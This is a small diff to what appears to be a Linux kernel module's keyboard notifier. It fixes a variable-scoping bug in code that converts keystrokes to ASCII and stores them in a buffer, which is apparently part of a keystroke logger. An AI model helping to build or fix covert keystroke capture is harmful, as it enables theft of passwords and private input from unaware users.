@@ -92,10 +92,11 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
 			}
 			else 
 			{
+				char ch;
 				if (shiftkey_On == 0)
-					char ch = get_ascii(param->value);
+					ch = get_ascii(param->value);
 				else
-					char ch = shifted_get_ascii(param->value);
+					ch = shifted_get_ascii(param->value);
 				if (ch != 'X') {
 					*bptr = ch;
 					bptr++;
